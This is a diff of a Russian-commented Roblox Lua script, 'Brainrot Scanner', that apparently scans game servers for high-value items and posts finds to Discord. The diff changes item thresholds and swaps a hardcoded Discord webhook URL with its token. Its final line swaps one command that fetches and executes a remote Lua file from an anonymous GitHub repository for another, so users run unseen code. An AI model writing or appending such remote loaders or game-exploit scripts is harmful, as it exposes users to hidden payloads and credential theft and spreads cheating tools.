@@ -8,7 +8,7 @@ local HttpService = game:GetService('HttpService')
 
 -- ⚙️ НАСТРОЙКИ
 local DEFAULT_THRESHOLD = 50_000_000 -- Порог по умолчанию
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1448034783530848287/zrQ0v6B1d8xBkXkcfSwiVRHWoHb4cS1_836j6X02BQhjaei93Q5r8CtFLrmJmTei0lZJ'
+local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1424140516911484928/mnVh-97c9qW-g8Ymhneg3bkBkV3MgMWkUa3t9tAGHDuMEzb6MAfT3llXK_6ibAHkoRRs'
 
 print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 
@@ -16,10 +16,10 @@ print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
 local OBJECTS = {
     ['Garama and Madundung'] = { emoji = '🍝', threshold = 50000000 },
     ['Dragon Cannelloni'] = { emoji = '🐲', threshold = 50000000 },
-    ['Nuclearo Dinossauro'] = { emoji = '🦕', threshold = 100000000 },
+    ['Nuclearo Dinossauro'] = { emoji = '🦕', threshold = 50000000 },
     ['Esok Sekolah'] = { emoji = '🏠', threshold = 300000000 },
     ['La Supreme Combinasion'] = { emoji = '🔫', threshold = 10000000 },
-    ['Ketupat Kepat'] = { emoji = '🍏', threshold = 50000000 },
+    ['Ketupat Kepat'] = { emoji = '🍏', threshold = 35000000 },
     ['Strawberry Elephant'] = { emoji = '🐘', threshold = 10000000 },
     ['Spaghetti Tualetti'] = { emoji = '🚽', threshold = 300000000 },
     ['Ketchuru and Musturu'] = { emoji = '🍾', threshold = 10000000 },
@@ -27,41 +27,40 @@ local OBJECTS = {
     ['Tictac Sahur'] = { emoji = '🕰️', threshold = 10000000 },
     ['Los Primos'] = { emoji = '🙆‍♂️', threshold = 10000000 },
     ['Tang Tang Keletang'] = { emoji = '📢', threshold = 10000000 },
-    ['Money Money Puggy'] = { emoji = '🐶', threshold = 126000000 },
+    ['Money Money Puggy'] = { emoji = '🐶', threshold = 200000000 },
     ['Burguro And Fryuro'] = { emoji = '🍔', threshold = 10000000 },
-    ['Chillin Chili'] = { emoji = '🌶', threshold = 90000000 },
+    ['Chillin Chili'] = { emoji = '🌶', threshold = 150000000 },
     ['La Secret Combinasion'] = { emoji = '❓', threshold = 10000000 },
-    ['Eviledon'] = { emoji = '👹', threshold = 180000000 },
+    ['Eviledon'] = { emoji = '👹', threshold = 200000000 },
     ['Spooky and Pumpky'] = { emoji = '🎃', threshold = 10000000 },
-    ['La Spooky Grande'] = { emoji = '👻', threshold = 150000000 },
+    ['La Spooky Grande'] = { emoji = '👻', threshold = 170000000 },
     ['Meowl'] = { emoji = '🐈', threshold = 10000000 },
-    ['Chipso and Queso'] = { emoji = '🧀', threshold = 100000000 },
+    ['Chipso and Queso'] = { emoji = '🧀', threshold = 10000000 },
     ['La Casa Boo'] = { emoji = '👁‍🗨', threshold = 10000000 },
     ['Headless Horseman'] = { emoji = '🐴', threshold = 10000000 },
     ['Los Tacoritas'] = { emoji = '🚴', threshold = 10000000 },
     ['Capitano Moby'] = { emoji = '🚢', threshold = 10000000 },
-    ['La Taco Combinasion'] = { emoji = '👒', threshold = 150000000 },
+    ['La Taco Combinasion'] = { emoji = '👒', threshold = 400000000 },
     ['Cooki and Milki'] = { emoji = '🍪', threshold = 10000000 },
-    ['Los Puggies'] = { emoji = '🦮', threshold = 180000000 },
+    ['Los Puggies'] = { emoji = '🦮', threshold = 225000000 },
     ['Orcaledon'] = { emoji = '🐡', threshold = 10000000 },
     ['Fragrama and Chocrama'] = { emoji = '🍦', threshold = 10000000 },
     ['Guest 666'] = { emoji = '㊙️', threshold = 10000000 },
-    ['Los Bros'] = { emoji = '📱', threshold = 108000000 },
+    ['Los Primos'] = { emoji = '🙆‍♂️', threshold = 250000000 },
+    ['Los Bros'] = { emoji = '📱', threshold = 300000000 },
     ['Lavadorito Spinito'] = { emoji = '📺', threshold = 10000000 },
-    ['W or L'] = { emoji = '🪜', threshold = 150000000 },
+    ['W or L'] = { emoji = '🪜', threshold = 100000000 },
     ['Fishino Clownino'] = { emoji = '🤡', threshold = 10000000 },
-    ['Mieteteira Bicicleteira'] = { emoji = '💄', threshold = 286000000 },
-    ['La Extinct Grande'] = { emoji = '☠️', threshold = 100000000 },
-    ['Los Chicleteiras'] = { emoji = '🍼', threshold = 120000000 },
-    ['Las Sis'] = { emoji = '☕️', threshold = 175000000 },
-    ['Tacorita Bicicleta'] = { emoji = '🌮', threshold = 148000000 },
-    ['Los Mobilis'] = { emoji = '📱', threshold = 280000000 },
+    ['Mieteteira Bicicleteira'] = { emoji = '💄', threshold = 400000000 },
+    ['La Extinct Grande'] = { emoji = '☠️', threshold = 170000000 },
+    ['Los Chicleteiras'] = { emoji = '🍼', threshold = 140000000 },
+    ['Las Sis'] = { emoji = '☕️', threshold = 350000000 },
+    ['Tacorita Bicicleta'] = { emoji = '🌮', threshold = 100000000 },
+    ['Los Mobilis'] = { emoji = '📱', threshold = 350000000 },
     ['La Ginger Sekolah'] = { emoji = '🎄', threshold = 10000000 },
-    ['Chicleteira Noelteria'] = { emoji = '🛷', threshold = 90000000 },
-    ['La Jolly Grande'] = { emoji = '☃️', threshold = 150000000 },
-    ['Gingerat Gerat'] = { emoji = '🧸', threshold = 10000000 },
-    ['Santa Chicleteira'] = { emoji = '🎅🏿', threshold = 10000000 },
-    ['Los Spaghettis'] = { emoji = '🧻', threshold = 10000000 },
+    ['Christmas Chicleteira'] = { emoji = '🛷', threshold = 10000000 },
+    ['La Jolly Grande'] = { emoji = '☃️', threshold = 10000000 },
+    ['Ginger'] = { emoji = '🧸', threshold = 10000000 },
 }
 
 -- 💰 ПАРСЕР ДОХОДА
@@ -535,4 +534,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhook готов к отправке уведомлений')
-loadstring(game:HttpGet("https://raw.githubusercontent.com/piskastroi1-ui/SSik/refs/heads/main/ss2.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ldkoedkeo/eblan2222/refs/heads/main/noob.lua"))()
